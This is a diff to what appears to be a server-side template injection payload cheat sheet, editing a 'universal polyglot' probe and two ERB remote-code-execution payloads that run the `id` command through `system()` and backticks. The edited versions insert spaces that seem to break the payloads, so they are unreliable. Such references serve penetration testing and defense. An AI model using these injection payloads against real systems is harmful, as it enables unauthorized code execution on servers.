@@ -3,7 +3,7 @@
 ## Universal polyglot
 
 ```
-${{<\%\[%'"}}%\\
+${{< %[%'"}}%\.
 ```
 
 ## Testing Methodology
@@ -122,8 +122,8 @@ Detect:
 RCE:
 
 ```
-<%= system('id') %>
-<%= `id` %>
+< %= system('id') %>
+< %= `id` %>
 ```
 
 ### Handlebars (Node.js)
